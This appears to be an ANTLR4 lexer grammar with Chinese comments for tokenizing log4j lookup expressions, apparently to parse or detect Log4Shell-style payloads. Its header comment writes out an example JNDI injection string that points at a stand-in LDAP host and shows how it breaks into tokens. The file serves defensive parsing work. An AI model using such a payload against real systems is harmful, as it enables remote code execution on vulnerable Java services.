// ============================================================
// Log4jTokens.g4 — log4j 查找表达式共享词法
// ------------------------------------------------------------
// 为 log4j/log4shell 类载荷设计：只保留 ${...} 结构字符
// （$ { } :）与"内容段"CHUNK，其余一律归入 CHUNK 连续段
// （单词 / URL / scheme / 端口 / 路径 / 负数等一次收完）。
//
//   ${jndi:ldap://evil.com:1389/a}
//    -> DOLLAR LBRACE CHUNK(jndi) COLON
//       CHUNK(ldap://evil.com) COLON CHUNK(1389/a) RBRACE
//
// 空白跳过；无 UNKNOWN 丢弃（所有可见字符都进 CHUNK）。
// ============================================================

lexer grammar Log4jTokens;

DOLLAR : '$' ;
LBRACE : '{' ;
RBRACE : '}' ;
COLON  : ':' ;

// 结构字符与空白之外的一切连续段（含 / . - = @ ? & % # 等 URL 字符；
// 冒号是前缀分隔符/端口分隔符，必须单独成 token，故排除）
// 注意：ANTLR4 字符类取反用 ~[...]，[^...] 会把 ^ 当作普通字符
CHUNK : ~[${}: \t\r\n]+ ;

WS : [ \t\r\n]+ -> skip;
